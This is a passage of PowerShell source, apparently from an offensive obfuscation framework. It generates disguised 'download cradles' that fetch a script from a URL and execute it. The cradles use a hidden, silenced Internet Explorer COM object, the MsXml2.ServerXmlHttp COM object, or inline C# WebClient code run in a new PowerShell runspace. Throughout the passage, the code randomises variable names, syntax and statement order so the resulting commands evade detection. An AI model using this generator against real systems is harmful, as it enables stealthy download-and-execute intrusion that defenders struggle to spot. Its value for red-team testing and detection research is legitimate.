                        Write-Host " $TokenName" -NoNewline -ForegroundColor Cyan
                        Write-Host " will not be applied.`n         Doing so would require another COM object and more cleanup.`n"
                    }

                    # Highlight $PropertyFlag if Rearrange is the option explicitly selected during this execution.
                    If($TokenNameUpdatedThisIteration -eq 'Rearrange') {$PropertyFlagWithTags = '<<<0' + $PropertyFlag + '0>>>'}

                    # For all variables in $VarsUsedInThisBlock this For loop will set the appropriate VARNAME+'WithTags' values.
                    # It will also set the final $CradleSyntax and CradleSyntaxWithTags variables.
                    $VarsUsedInThisBlock += @('Invoke','Url','Command','CommandEscapedString','NewObject','ComObjectFlag','Navigate','RuntimeInteropServicesMarshal','Visible','BooleanFalse','Silent','BooleanTrue','Sleep','PropertyFlag','Busy','Document','Body','InnerText')
                    For($i=1; $i -le 2; $i++)
                    {
                        $FinalVariableName = 'CradleSyntax'
                        If($i -eq 2)
                        {
                            $FinalVariableName = 'CradleSyntaxWithTags'

                            ForEach($Var in $VarsUsedInThisBlock) {Set-Variable $Var (Get-Variable ($Var + 'WithTags')).Value}
                              
                            $PropertyArray = $PropertyArrayWithTags
                        }

                        # Substitute appropriate tags for consistency across sub-components and differences in arrangements.
                        $Busy      =      $Busy.Replace($VarTag1,$GetVar1)
                        $Document  =  $Document.Replace($VarTag1,$GetVar1)
                        $Body      =      $Body.Replace($VarTag1,$GetVar1).Replace($DocumentTag,$Document)
                        $InnerText = $InnerText.Replace($VarTag1,$GetVar1).Replace($DocumentTag,$Document).Replace($BodyTag,$Body)

                        # Set random order of property values to be used in below -Property array.
                        $PropertyArray         =  @("$Navigate='$Url'","$Visible=$BooleanFalse","$Silent=$BooleanTrue")[$PropertyArrayIndex_012] -Join ';'
                        $PropertyArrayWithTags = $PropertyArray.Replace($Navigate,$NavigateWithTags).Replace($Visible,$VisibleWithTags).Replace($Silent,$SilentWithTags)

                        # Set command arrangement logic here.
                        $CommandArray   = @()

                        If($NewObject.Contains($ModuleAutoLoadTag))
                        {
                            $CurrentModuleAutoLoadRandom = $ModuleAutoLoadRandom
                            If($NewObject.EndsWith('0>>>'))
                            {
                                $CurrentModuleAutoLoadRandom = '<<<0' + $CurrentModuleAutoLoadRandom + '0>>>'
                            }
                        }
                        Else
                        {
                            $CurrentModuleAutoLoadRandom = ''
                        }
                        $CommandArray += $CurrentModuleAutoLoadRandom + $SetVar1 + $NewObject.Replace($ModuleAutoLoadTag,'') + "$ComObjectFlag InternetExplorer.Application $PropertyFlag @{$PropertyArray}"

                        $SyntaxToInvoke = "$GetVar1.$Document.$Body.$InnerText"

                        $CommandArray += "While($GetVar1.$Busy){$Sleep}" + $Invoke.Replace($InvokeTag,$SyntaxToInvoke).Replace($CommandTag,$Command).Replace($CommandEscapedStringTag,$CommandEscapedString)
                        $CommandArray += "$GetVar1.Quit()"
                        $CommandArray += "$RuntimeInteropServicesMarshal::ReleaseComObject($GetVar1)"
                          
                        If(!$Invoke.Contains($CommandTag) -AND !$Invoke.Contains($CommandEscapedStringTag))
                        {
                            If($Command) {$CommandArray += $Command}
                        }

                        # Set command arrangement logic here.
                        $Syntax = ($CommandArray -Join ';')

                        Set-Variable $FinalVariableName $Syntax
                    }
                }
                3 {
                    # Syntax concatenate into logical variable count but random names with obfuscated variable GET/SET syntax.
                      
                    $VarOptionsIndex  = 1
                    $NumberOfVarNames = 2

                    # Since we need to set properties for GetVar1 we must make sure that this variable uses .Value syntax instead of -ValueOnly syntax.
                    Do
                    {
                        # This array will keep track of all variables necessary in this block's final $CommandArray syntax.
                        $VarsUsedInThisBlock  = @()
                        $VarsUsedInThisBlock += Set-GetSetVariables $NumberOfVarNames $VarOptionsIndex
                    }
                    While(!$Script:GetVar1.EndsWith('.Value'))
                    
                    # Set all new variables from above function to current variable context (from script-level to normal-level).
                    For($k=1; $k -le $NumberOfVarNames; $k++)
                    {
                        ForEach($VarName in @("SetVar$k","GetVar$k","SetVar$k`WithTags","GetVar$k`WithTags")) {Set-Variable $VarName (Get-Variable $VarName -Scope Script).Value}
                    }

                    # For all variables in $VarsUsedInThisBlock this For loop will set the appropriate VARNAME+'WithTags' values.
                    # It will also set the final $CradleSyntax and CradleSyntaxWithTags variables.
                    $VarsUsedInThisBlock += @('Invoke','Url','Command','CommandEscapedString','NewObject','ComObjectFlag','Navigate','RuntimeInteropServicesMarshal','Visible','BooleanFalse','Silent','BooleanTrue','Sleep','Busy','Document','Body','InnerText')
                    For($i=1; $i -le 2; $i++)
                    {
                        $FinalVariableName = 'CradleSyntax'
                        If($i -eq 2)
                        {
                            $FinalVariableName = 'CradleSyntaxWithTags'
                            ForEach($Var in $VarsUsedInThisBlock) {Set-Variable $Var (Get-Variable ($Var + 'WithTags')).Value}
                        }

                        # Substitute appropriate tags for consistency across sub-components and differences in arrangements.
                        $Navigate  =  $Navigate.Replace($VarTag1,$GetVar1)
                        $Visible   =   $Visible.Replace($VarTag1,$GetVar1)
                        $Silent    =    $Silent.Replace($VarTag1,$GetVar1)
                        $Busy      =      $Busy.Replace($VarTag1,$GetVar1)
                        $Document  =  $Document.Replace($VarTag1,$GetVar1)
                        $Body      =      $Body.Replace($VarTag1,$GetVar1).Replace($DocumentTag,$Document)
                        $InnerText = $InnerText.Replace($VarTag1,$GetVar1).Replace($DocumentTag,$Document).Replace($BodyTag,$Body)

                        # Set command arrangement logic here.
                        $CommandArray   = @()

                        If($NewObject.Contains($ModuleAutoLoadTag))
                        {
                            $CurrentModuleAutoLoadRandom = $ModuleAutoLoadRandom
                            If($NewObject.EndsWith('0>>>'))
                            {
                                $CurrentModuleAutoLoadRandom = '<<<0' + $CurrentModuleAutoLoadRandom + '0>>>'
                            }
                        }
                        Else
                        {
                            $CurrentModuleAutoLoadRandom = ''
                        }
                        $CommandArray += $CurrentModuleAutoLoadRandom + $SetVar1 + '(' + $NewObject.Replace($ModuleAutoLoadTag,'') + "$ComObjectFlag InternetExplorer.Application)"

                        $CommandArray  += "While($GetVar1.$Busy){$Sleep}$GetVar1.$Visible=$BooleanFalse"
                        $CommandArray  += "$GetVar1.$Silent=$BooleanTrue"
                        $CommandArray  += "$GetVar1.$Navigate('$Url')"
                          
                        $SyntaxToInvoke = "$GetVar1.$Document.$Body.$InnerText"

                        $CommandArray += "While($GetVar1.Busy){$Sleep}" + $Invoke.Replace($InvokeTag,$SyntaxToInvoke).Replace($CommandTag,$Command).Replace($CommandEscapedStringTag,$CommandEscapedString)
                        $CommandArray += "$GetVar1.Quit()"
                        $CommandArray += "$RuntimeInteropServicesMarshal::ReleaseComObject($GetVar1)"
                          
                        If(!$Invoke.Contains($CommandTag) -AND !$Invoke.Contains($CommandEscapedStringTag))
                        {
                            If($Command) {$CommandArray += $Command}
                        }

                        # Set alternate command arrangement logic here.
                        $CommandArray2  = @()
                        $CommandArray2 += "$SetVar1`InternetExplorer.Application"
                        $CommandArray2 += $CurrentModuleAutoLoadRandom + $SetVar1 + '(' + $NewObject.Replace($ModuleAutoLoadTag,'') + "$ComObjectFlag $GetVar1)"
                        $CommandArray2 += "While($GetVar1.$Busy){$Sleep}$GetVar1.$Visible=$BooleanFalse"
                        $CommandArray2 += "$GetVar1.$Silent=$BooleanTrue"
                        $CommandArray2 += "$SetVar2'$Url'"
                        $CommandArray2 += "$GetVar1.$Navigate($GetVar2)"

                        $SyntaxToInvoke = "$GetVar1.$Document.$Body.$InnerText"

                        $CommandArray2 += "While($GetVar1.$Busy){$Sleep}" + $Invoke.Replace($InvokeTag,$SyntaxToInvoke).Replace($CommandTag,$Command).Replace($CommandEscapedStringTag,$CommandEscapedString)
                        $CommandArray2 += "$GetVar1.Quit()"
                        $CommandArray2 += "$RuntimeInteropServicesMarshal::ReleaseComObject($GetVar1)"
                          
                        If(!$Invoke.Contains($CommandTag) -AND !$Invoke.Contains($CommandEscapedStringTag))
                        {
                            If($Command) {$CommandArray2 += $Command}
                        }

                        # Set command arrangement logic here.
                        Switch($SwitchRandom_01)
                        {
                            1 {$Syntax = ($CommandArray -Join ';')}
                            2 {$Syntax = (($CommandArray2[$Array2IndexOrder_01234] + $CommandArray2[5,6,7,8,9]) -Join ';')}
                        }

                        Set-Variable $FinalVariableName $Syntax
                    }
                }
                4 {
                    # Syntax concatenate into logical variable count but random names with obfuscated variable GET/SET syntax.

                    $VarOptionsIndex  = 1
                    $NumberOfVarNames = 2

                    # This array will keep track of all variables necessary in this block's final $CommandArray syntax.
                    $VarsUsedInThisBlock  = @()
                    $VarsUsedInThisBlock += Set-GetSetVariables $NumberOfVarNames $VarOptionsIndex
 
                    # Set all new variables from above function to current variable context (from script-level to normal-level).
                    For($k=1; $k -le $NumberOfVarNames; $k++)
                    {
                        ForEach($VarName in @("SetVar$k","GetVar$k","SetVar$k`WithTags","GetVar$k`WithTags")) {Set-Variable $VarName (Get-Variable $VarName -Scope Script).Value}
                    }
                      
                    # Substitute appropriate tags for consistency across sub-components and differences in arrangements.
                    # Fall back to default options for these values since they are in Property array.
                    $NavigateWithTags  = $NavigateWithTags.Replace($Navigate,$NavigateOptions[0])
                    $Navigate          = $NavigateOptions[0]
                    $VisibleWithTags   = $VisibleWithTags.Replace($Visible,$VisibleOptions[0])
                    $Visible           = $VisibleOptions[0]
                    $SilentWithTags    = $SilentWithTags.Replace($Silent,$SilentOptions[0])
                    $Silent            = $SilentOptions[0]

                    # Highlight $PropertyFlag if Rearrange is the option explicitly selected during this execution.
                    Switch($TokenNameUpdatedThisIteration)
                    {
                        'Rearrange' {$PropertyFlagWithTags = '<<<0' + $PropertyFlag + '0>>>'}
                        'Navigate'  {$NavigateWithTags     = '<<<0' + $Navigate     + '0>>>'}
                        'Visible'   {$VisibleWithTags      = '<<<0' + $Visible      + '0>>>'}
                        'Silent'    {$SilentWithTags       = '<<<0' + $Silent       + '0>>>'}
                    }

                    # Throw warning for certain obfsucation options that will not be applied to current syntax arrangement.
                    # For these options back down to default values as long as current syntax arrangement option is selected.
                    If(@('Navigate','Visible','Silent') -Contains $TokenNameUpdatedThisIteration)
                    {
                        Write-Host "`n"
                        Write-Host "WARNING:" -NoNewline -ForegroundColor Yellow
                        Write-Host " We are using" -NoNewLine
                        Write-Host " -Property" -NoNewline -ForegroundColor Cyan
                        Write-Host " in current syntax arrangement.`n         Therefore, all options for" -NoNewline
                        Write-Host " $TokenName" -NoNewline -ForegroundColor Cyan
                        Write-Host " will not be applied.`n         Doing so would require another COM object and more cleanup.`n"
                    }

                    # Highlight $PropertyFlag if Rearrange is the option explicitly selected during this execution.
                    If($TokenNameUpdatedThisIteration -eq 'Rearrange') {$PropertyFlagWithTags = '<<<0' + $PropertyFlag + '0>>>'}

                    # For all variables in $VarsUsedInThisBlock this For loop will set the appropriate VARNAME+'WithTags' values.
                    # It will also set the final $CradleSyntax and CradleSyntaxWithTags variables.
                    $VarsUsedInThisBlock += @('Invoke','Url','Command','CommandEscapedString','NewObject','ComObjectFlag','Navigate','RuntimeInteropServicesMarshal','Visible','BooleanFalse','Silent','BooleanTrue','Sleep','PropertyFlag','Busy','Document','Body','InnerText')
                    For($i=1; $i -le 2; $i++)
                    {
                        $FinalVariableName = 'CradleSyntax'
                        If($i -eq 2)
                        {
                            $FinalVariableName = 'CradleSyntaxWithTags'

                            ForEach($Var in $VarsUsedInThisBlock) {Set-Variable $Var (Get-Variable ($Var + 'WithTags')).Value}

                            $PropertyArray = $PropertyArrayWithTags
                        }

                        # Substitute appropriate tags for consistency across sub-components and differences in arrangements.
                        $Busy      =      $Busy.Replace($VarTag1,$GetVar1)
                        $Document  =  $Document.Replace($VarTag1,$GetVar1)
                        $Body      =      $Body.Replace($VarTag1,$GetVar1).Replace($DocumentTag,$Document)
                        $InnerText = $InnerText.Replace($VarTag1,$GetVar1).Replace($DocumentTag,$Document).Replace($BodyTag,$Body)

                        # Set random order of property values to be used in below -Property array.
                        $PropertyArray         =  @("$Navigate='$Url'","$Visible=$BooleanFalse","$Silent=$BooleanTrue")[$PropertyArrayIndex_012] -Join ';'
                        $PropertyArrayWithTags = $PropertyArray.Replace($Navigate,$NavigateWithTags).Replace($Visible,$VisibleWithTags).Replace($Silent,$SilentWithTags)

                        # Set command arrangement logic here.
                        $CommandArray   = @()

                        If($NewObject.Contains($ModuleAutoLoadTag))
                        {
                            $CurrentModuleAutoLoadRandom = $ModuleAutoLoadRandom
                            If($NewObject.EndsWith('0>>>'))
                            {
                                $CurrentModuleAutoLoadRandom = '<<<0' + $CurrentModuleAutoLoadRandom + '0>>>'
                            }
                        }
                        Else
                        {
                            $CurrentModuleAutoLoadRandom = ''
                        }
                        $CommandArray += $CurrentModuleAutoLoadRandom + $SetVar1 + '(' + $NewObject.Replace($ModuleAutoLoadTag,'') + "$ComObjectFlag InternetExplorer.Application $PropertyFlag @{$PropertyArray})"

                        $SyntaxToInvoke = "$GetVar1.$Document.$Body.$InnerText"

                        $CommandArray += "While($GetVar1.$Busy){$Sleep}" + $Invoke.Replace($InvokeTag,$SyntaxToInvoke).Replace($CommandTag,$Command).Replace($CommandEscapedStringTag,$CommandEscapedString)
                        $CommandArray += "$GetVar1.Quit()"
                        $CommandArray += "$RuntimeInteropServicesMarshal::ReleaseComObject($GetVar1)"
                          
                        If(!$Invoke.Contains($CommandTag) -AND !$Invoke.Contains($CommandEscapedStringTag))
                        {
                            If($Command) {$CommandArray += $Command}
                        }

                        # Set command arrangement logic here.
                        $Syntax = ($CommandArray -Join ';')

                        Set-Variable $FinalVariableName $Syntax
                    }
                }
                default {Write-Error "An invalid `$Rearrange value ($Rearrange) was passed to switch block for Out-Cradle `$Cradle value ($Cradle)."; Exit}
            }

            # Add final cradle syntax (with and without tags) and update token value to $CradleSyntaxOptions to be returned if -ReturnAsArray Switch was specified.
            $CradleSyntaxOptions = @($CradleSyntax,$CradleSyntaxWithTags,@($TokenNameUpdatedThisIteration,$TokenValueUpdatedThisIteration))
        }
        14 {
            ######################################################
            ## PSCOMMSXML - COM Object With MsXml.ServerXmlHttp ##
            ######################################################

            # Switch block for changing overall syntax arrangement depending on the level passed in with the REARRANGE option.
            # If last option in $TokenArray is ALL then we will choose the highest value for $Rearrange in the below block since each Cradle can have differing numbers of $Rearrange values.
            If($AllOptionSelected) {$Rearrange = 2}
            Switch($Rearrange)
            {
                1 {
                    # Syntax concatenate into logical variable count and names with default variable GET/SET syntax.
                      
                    # Set more logical variable names for this block.
                    $RandomVarName1 = 'comMsXml' # MsXml COM Object
                    $RandomVarName2 = 'url'      # URL

                    $VarOptionsIndex  = 0
                    $NumberOfVarNames = 2
                          
                    # This array will keep track of all variables necessary in this block's final $CommandArray syntax.
                    $VarsUsedInThisBlock  = @()
                    $VarsUsedInThisBlock += Set-GetSetVariables $NumberOfVarNames $VarOptionsIndex

                    # Set all new variables from above function to current variable context (from script-level to normal-level).
                    For($k=1; $k -le $NumberOfVarNames; $k++)
                    {
                        ForEach($VarName in @("SetVar$k","GetVar$k","SetVar$k`WithTags","GetVar$k`WithTags")) {Set-Variable $VarName (Get-Variable $VarName -Scope Script).Value}
                    }

                    # For all variables in $VarsUsedInThisBlock this For loop will set the appropriate VARNAME+'WithTags' values.
                    # It will also set the final $CradleSyntax and CradleSyntaxWithTags variables.
                    $VarsUsedInThisBlock += @('Invoke','Url','Command','CommandEscapedString','NewObject','ComObjectFlag','BooleanFalse','Open2','Send','ResponseText')
                    For($i=1; $i -le 2; $i++)
                    {
                        $FinalVariableName = 'CradleSyntax'
                        If($i -eq 2)
                        {
                            $FinalVariableName = 'CradleSyntaxWithTags'
                            ForEach($Var in $VarsUsedInThisBlock) {Set-Variable $Var (Get-Variable ($Var + 'WithTags')).Value}
                        }
                          
                        # Substitute appropriate tags for consistency across sub-components and differences in arrangements.
                        $Open         =        $Open2.Replace($VarTag1,$GetVar1)
                        $Send         =         $Send.Replace($VarTag1,$GetVar1)
                        $ResponseText = $ResponseText.Replace($VarTag1,$GetVar1)

                        # Set command arrangement logic here.
                        $CommandArray  = @()

                        If($NewObject.Contains($ModuleAutoLoadTag))
                        {
                            $CurrentModuleAutoLoadRandom = $ModuleAutoLoadRandom
                            If($NewObject.EndsWith('0>>>'))
                            {
                                $CurrentModuleAutoLoadRandom = '<<<0' + $CurrentModuleAutoLoadRandom + '0>>>'
                            }
                        }
                        Else
                        {
                            $CurrentModuleAutoLoadRandom = ''
                        }
                        $CommandArray += $CurrentModuleAutoLoadRandom + $SetVar1 + $NewObject.Replace($ModuleAutoLoadTag,'') + "$ComObjectFlag MsXml2.ServerXmlHttp"    
                        $CommandArray += "$GetVar1.$Open('GET','$Url',$BooleanFalse)"
                        $CommandArray += "$GetVar1.$Send()"

                        $SyntaxToInvoke = "$GetVar1.$ResponseText"
                        
                        $CommandArray += $Invoke.Replace($InvokeTag,$SyntaxToInvoke).Replace($CommandTag,$Command).Replace($CommandEscapedStringTag,$CommandEscapedString)
                          
                        If(!$Invoke.Contains($CommandTag) -AND !$Invoke.Contains($CommandEscapedStringTag))
                        {
                            If($Command) {$CommandArray += $Command}
                        }

                        # Set alternate command arrangement logic here.
                        $CommandArray2  = @()

                        If($NewObject.Contains($ModuleAutoLoadTag))
                        {
                            $CurrentModuleAutoLoadRandom = $ModuleAutoLoadRandom
                            If($NewObject.EndsWith('0>>>'))
                            {
                                $CurrentModuleAutoLoadRandom = '<<<0' + $CurrentModuleAutoLoadRandom + '0>>>'
                            }
                        }
                        Else
                        {
                            $CurrentModuleAutoLoadRandom = ''
                        }
                        $CommandArray2 += $CurrentModuleAutoLoadRandom + $SetVar1 + $NewObject.Replace($ModuleAutoLoadTag,'') + "$ComObjectFlag MsXml2.ServerXmlHttp"
                        $CommandArray2 += $SetVar2 + "'$Url'"
                        $CommandArray2 += "$GetVar1.$Open('GET',$GetVar2,$BooleanFalse)"
                        $CommandArray2 += "$GetVar1.$Send()"

                        $SyntaxToInvoke = "$GetVar1.$ResponseText"
                        
                        $CommandArray2 += $Invoke.Replace($InvokeTag,$SyntaxToInvoke).Replace($CommandTag,$Command).Replace($CommandEscapedStringTag,$CommandEscapedString)
                          
                        If(!$Invoke.Contains($CommandTag) -AND !$Invoke.Contains($CommandEscapedStringTag))
                        {
                            If($Command) {$CommandArray2 += $Command}
                        }

                        # Set command ordering arrangement logic here.
                        Switch($SwitchRandom_01)
                        {
                            1 {$Syntax = ($CommandArray -Join ';')}
                            2 {$Syntax = ($CommandArray2[$Array2IndexOrder_01] + $CommandArray2[2,3,4,5] -Join ';')}
                        }
                        
                        Set-Variable $FinalVariableName $Syntax
                    }
                }
                2 {
                    # Syntax concatenate into logical variable count but random names with obfuscated variable GET/SET syntax.
                          
                    $VarOptionsIndex  = 1
                    $NumberOfVarNames = 2
                          
                    # This array will keep track of all variables necessary in this block's final $CommandArray syntax.
                    $VarsUsedInThisBlock  = @()
                    $VarsUsedInThisBlock += Set-GetSetVariables $NumberOfVarNames $VarOptionsIndex

                    # Set all new variables from above function to current variable context (from script-level to normal-level).
                    For($k=1; $k -le $NumberOfVarNames; $k++)
                    {
                        ForEach($VarName in @("SetVar$k","GetVar$k","SetVar$k`WithTags","GetVar$k`WithTags")) {Set-Variable $VarName (Get-Variable $VarName -Scope Script).Value}
                    }

                    # For all variables in $VarsUsedInThisBlock this For loop will set the appropriate VARNAME+'WithTags' values.
                    # It will also set the final $CradleSyntax and CradleSyntaxWithTags variables.
                    $VarsUsedInThisBlock += @('Invoke','Url','Command','CommandEscapedString','NewObject','ComObjectFlag','BooleanFalse','Open2','Send','ResponseText')
                    For($i=1; $i -le 2; $i++)
                    {
                        $FinalVariableName = 'CradleSyntax'
                        If($i -eq 2)
                        {
                            $FinalVariableName = 'CradleSyntaxWithTags'
                            ForEach($Var in $VarsUsedInThisBlock) {Set-Variable $Var (Get-Variable ($Var + 'WithTags')).Value}
                        }
                          
                        # Substitute appropriate tags for consistency across sub-components and differences in arrangements.
                        $Open         =        $Open2.Replace($VarTag1,$GetVar1)
                        $Send         =         $Send.Replace($VarTag1,$GetVar1)
                        $ResponseText = $ResponseText.Replace($VarTag1,$GetVar1)

                        # Set command arrangement logic here.
                        $CommandArray  = @()

                        If($NewObject.Contains($ModuleAutoLoadTag))
                        {
                            $CurrentModuleAutoLoadRandom = $ModuleAutoLoadRandom
                            If($NewObject.EndsWith('0>>>'))
                            {
                                $CurrentModuleAutoLoadRandom = '<<<0' + $CurrentModuleAutoLoadRandom + '0>>>'
                            }
                        }
                        Else
                        {
                            $CurrentModuleAutoLoadRandom = ''
                        }
                        $CommandArray += $CurrentModuleAutoLoadRandom + $SetVar1 + '(' + $NewObject.Replace($ModuleAutoLoadTag,'') + "$ComObjectFlag MsXml2.ServerXmlHttp" + ')'
                        $CommandArray += "$GetVar1.$Open('GET','$Url',$BooleanFalse)"
                        $CommandArray += "$GetVar1.$Send()"

                        $SyntaxToInvoke = "$GetVar1.$ResponseText"
                        
                        $CommandArray += $Invoke.Replace($InvokeTag,$SyntaxToInvoke).Replace($CommandTag,$Command).Replace($CommandEscapedStringTag,$CommandEscapedString)
                          
                        If(!$Invoke.Contains($CommandTag) -AND !$Invoke.Contains($CommandEscapedStringTag))
                        {
                            If($Command) {$CommandArray += $Command}
                        }

                        # Set alternate command arrangement logic here.
                        $CommandArray2  = @()

                        If($NewObject.Contains($ModuleAutoLoadTag))
                        {
                            $CurrentModuleAutoLoadRandom = $ModuleAutoLoadRandom
                            If($NewObject.EndsWith('0>>>'))
                            {
                                $CurrentModuleAutoLoadRandom = '<<<0' + $CurrentModuleAutoLoadRandom + '0>>>'
                            }
                        }
                        Else
                        {
                            $CurrentModuleAutoLoadRandom = ''
                        }
                        $CommandArray2 += $CurrentModuleAutoLoadRandom + $SetVar1 + '(' + $NewObject.Replace($ModuleAutoLoadTag,'') + "$ComObjectFlag MsXml2.ServerXmlHttp" + ')'
                        $CommandArray2 += $SetVar2 + "'$Url'"
                        $CommandArray2 += "$GetVar1.$Open('GET',$GetVar2,$BooleanFalse)"
                        $CommandArray2 += "$GetVar1.$Send()"

                        $SyntaxToInvoke = "$GetVar1.$ResponseText"
                        
                        $CommandArray2 += $Invoke.Replace($InvokeTag,$SyntaxToInvoke).Replace($CommandTag,$Command).Replace($CommandEscapedStringTag,$CommandEscapedString)
                          
                        If(!$Invoke.Contains($CommandTag) -AND !$Invoke.Contains($CommandEscapedStringTag))
                        {
                            If($Command) {$CommandArray2 += $Command}
                        }

                        # Set command ordering arrangement logic here.
                        Switch($SwitchRandom_01)
                        {
                            1 {$Syntax = ($CommandArray -Join ';')}
                            2 {$Syntax = ($CommandArray2[$Array2IndexOrder_01] + $CommandArray2[2,3,4,5] -Join ';')}
                        }
                        
                        Set-Variable $FinalVariableName $Syntax
                    }
                }
                default {Write-Error "An invalid `$Rearrange value ($Rearrange) was passed to switch block for Out-Cradle `$Cradle value ($Cradle)."; Exit}
            }

            # Add final cradle syntax (with and without tags) and update token value to $CradleSyntaxOptions to be returned if -ReturnAsArray Switch was specified.
            $CradleSyntaxOptions = @($CradleSyntax,$CradleSyntaxWithTags,@($TokenNameUpdatedThisIteration,$TokenValueUpdatedThisIteration))
        }
        15 {
            ###############################################
            ## PSINLINECSHARP - Add-Type + Inline CSharp ##
            ###############################################

            # Switch block for changing overall syntax arrangement depending on the level passed in with the REARRANGE option.
            # If last option in $TokenArray is ALL then we will choose the highest value for $Rearrange in the below block since each Cradle can have differing numbers of $Rearrange values.
            If($AllOptionSelected) {$Rearrange = 3}
            Switch($Rearrange)
            {
                1 {
                    # Throw warning message if Automation or AutomationRunspaces classes are chosen but Invoke option is not 11 (thus these classes are not present in the command).
                    If(!$Invoke.Contains($InlineScriptTag) -AND (@('Automation','AutomationRunspaces') -Contains $LastVariableName))
                    {
                        Write-Host "`n`nWARNING: Cannot obfuscate the '$LastVariableName' class since it is not present." -ForegroundColor Yellow
                        Write-Host "         Select Invoke\11 to introduce this class into ObfuscatedCommand.`n" -ForegroundColor Yellow
                    }

                    # For all variables in $VarsUsedInThisBlock this For loop will set the appropriate VARNAME+'WithTags' values.
                    # It will also set the final $CradleSyntax and CradleSyntaxWithTags variables.
                    $VarsUsedInThisBlock += @('Invoke','Url','Command','CommandEscapedString','AddType','LanguageCSharp','SystemNet','Automation','AutomationRunspaces','ClassAndMethod')
                    For($i=1; $i -le 2; $i++)
                    {
                        $FinalVariableName = 'CradleSyntax'
                        If($i -eq 2)
                        {
                            $FinalVariableName = 'CradleSyntaxWithTags'
                            ForEach($Var in $VarsUsedInThisBlock) {Set-Variable $Var (Get-Variable ($Var + 'WithTags')).Value}
                        }
               
                        # Extract Class and Method names from $ClassAndMethod array.         
                        $ClassName  = $ClassAndMethod[0]
                        $MethodName = $ClassAndMethod[1]

                        # Array gets converted to a string when tags are applied earlier in the script, so we will split it back out and handle tags if they exist.
                        If($ClassAndMethod.GetType().Name -eq 'String')
                        {
                            $ClassName  = $ClassAndMethod.Split(' ')[0]
                            $MethodName = $ClassAndMethod.Split(' ')[1]
                            
                            # Handle tags if they exist.
                            If($ClassName.StartsWith('<<<0'))
                            {
                                $ClassName = $ClassName + '0>>>'
                            }
                            If($MethodName.EndsWith('0>>>'))
                            {
                                $MethodName = '<<<0' + $MethodName
                            }
                        }
                                                
                        # Extra steps to set and highlight two-part values -- Using and non-using for each class, and method/class name pair.
                        $UsingSystemNet = $SystemNet.ToString().Trim().Replace('<<<0 0>>>','<<<00>>>')
                        $SystemNet      = 'System.Net.'
                        If(($UsingSystemNet -ne '') -AND ($UsingSystemNet -ne '<<<00>>>'))
                        {
                            $SystemNet = ''
                        }
                        $UsingAutomation = $Automation.ToString().Trim().Replace('<<<0 0>>>','<<<00>>>')
                        $Automation      = 'System.Management.Automation.'
                        If(($UsingAutomation -ne '') -AND ($UsingAutomation -ne '<<<00>>>'))
                        {
                            $Automation = ''
                        }
                        $UsingAutomationRunspaces = $AutomationRunspaces.ToString().Trim().Replace('<<<0 0>>>','<<<00>>>')
                        $AutomationRunspaces = 'System.Management.Automation.Runspaces.'
                        If(($UsingAutomationRunspaces -ne '') -AND ($UsingAutomationRunspaces -ne '<<<00>>>'))
                        {
                            $AutomationRunspaces = ''
                        }

                        # Add tags for each class and method/class name if necessary.
                        If($UsingSystemNet.StartsWith('<<<0') -AND ($UsingSystemNet -ne ''))
                        {
                            $SystemNet = '<<<0' + $SystemNet + '0>>>'
                        }
                        If($UsingAutomation.StartsWith('<<<0') -AND ($UsingAutomation -ne ''))
                        {
                            $Automation = '<<<0' + $Automation + '0>>>'
                        }
                        If($UsingAutomationRunspaces.StartsWith('<<<0') -AND ($UsingAutomationRunspaces -ne ''))
                        {
                            $AutomationRunspaces = '<<<0' + $AutomationRunspaces + '0>>>'
                        }

                        # Set Inline CSharp syntaxes: first for default and second for if invoke option 11 (routed to 13) is selected.
                        $InlineCSharp             = "$UsingSystemNet`public class $ClassName{public static string $MethodName(string url){return (new $SystemNet`WebClient()).DownloadString(url);}}"
                        $InlineCSharpWithRunspace = "$UsingSystemNet$UsingAutomation$UsingAutomationRunspaces`public class $ClassName{public static void $MethodName(string url$InlineCommandParamTag){$AutomationRunspaces`Runspace rs=$AutomationRunspaces`RunspaceFactory.CreateRunspace();rs.Open();$Automation`PowerShell ps=$Automation`PowerShell.Create();ps.Runspace=rs;ps.AddScript((new $SystemNet`WebClient()).DownloadString(url)$InlineCommandTag);ps.Invoke();}}"

                        # Use this variable to denote if inline script invocation is occurring when Command is specified.
                        $CommandSetAsVariable = $NULL

                        # $InlineScriptTag is only present if option 11 was selected from the Invoke menu.
                        # If Command is defined then we should add an additional parameter and script syntax in $InlineCSharp.
                        If($Invoke.Contains($InlineScriptTag))
                        {
                            # Remove $InlineScriptTag from Invoke since we have this value in Invoke only to communicate that the Invoke option 11 (routed to 13) was selected.
                            $Invoke = $Invoke.Replace($InlineScriptTag,'')

                            # Set $Invoke to $InlineCSharpWithRunspace since the result will be invoked within the inline script.
                            $InlineCSharp = $InlineCSharpWithRunspace
                            
                            # We will add this parameter if $Command is defined.
                            $PostCradleCommandParam = ',string postcradlecommand'

                            # Add additional parameter for inline script and method invocation if $Command (PostCradleCommand) has been specified by the user. 
                            If($Command)
                            {
                                $InlineCSharp = $InlineCSharp.Replace($InlineCommandParamTag,$PostCradleCommandParam)
                                $InlineCSharp = $InlineCSharp.Replace($InlineCommandTag,'+";"+postcradlecommand')
                                $SyntaxToInvoke = "([$ClassName]::$MethodName('$Url',{$Command}))"
                                $Command = $NULL
                            }
                            Else
                            {
                                # Remove tags if no $Command (PostCradleCommand) has been specified by the user.
                                $InlineCSharp = $InlineCSharp.Replace($InlineCommandParamTag,'')
                                $InlineCSharp = $InlineCSharp.Replace($InlineCommandTag,'')
                                $SyntaxToInvoke = "([$ClassName]::$MethodName('$Url'))"
                            }
                            
                            # Add tags to $SyntaxToInvoke if Rearrange or AllOptions were selected since $SyntaxToInvoke now is our invocation syntax since payload is being invoked inside of the PS Runspace.
                            If(($i -eq 2) -AND ($AllOptionsSelected -OR ($LastVariableName -eq 'Invoke')))
                            {
                                $SyntaxToInvoke = '<<<0' + $SyntaxToInvoke + '0>>>'
                            }
                        }
                        Else
                        {
                            # Remove $InlineScriptTag from $Invoke since we have this value in Invoke only to communicate that the Invoke option 11 (routed to 13) was selected.
                            $Invoke = $Invoke.Replace($InlineScriptTag,'')

                            # Remove $InlineScriptTag from $InlineCSharp.
                            $InlineCSharp = $InlineCSharp.Replace($InlineScriptTag,'')

                            $SyntaxToInvoke = "([$ClassName]::$MethodName('$Url'))"
                        }

                        # Set command arrangement logic here.
                        $CommandArray  = @()

                        If($AddType.Contains($ModuleAutoLoadTag))
                        {
                            $CurrentModuleAutoLoadRandom = $ModuleAutoLoadRandom.Trim(';')
                            If($AddType.EndsWith('0>>>'))
                            {
